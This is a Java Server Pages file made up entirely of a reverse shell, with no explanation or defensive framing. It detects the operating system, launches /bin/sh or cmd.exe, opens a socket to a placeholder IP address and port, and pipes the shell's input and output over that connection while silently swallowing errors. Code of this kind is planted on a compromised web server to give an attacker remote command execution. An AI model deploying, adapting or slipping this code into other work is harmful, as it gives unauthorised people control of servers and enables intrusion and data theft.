<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream lq;
    OutputStream sz;

    StreamConnector( InputStream lq, OutputStream sz )
    {
      this.lq = lq;
      this.sz = sz;
    }

    public void run()
    {
      BufferedReader gf  = null;
      BufferedWriter ybi = null;
      try
      {
        gf  = new BufferedReader( new InputStreamReader( this.lq ) );
        ybi = new BufferedWriter( new OutputStreamWriter( this.sz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = gf.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ybi.write( buffer, 0, length );
          ybi.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( gf != null )
          gf.close();
        if( ybi != null )
          ybi.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "<IP_ADDRESS>", <PORT> );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
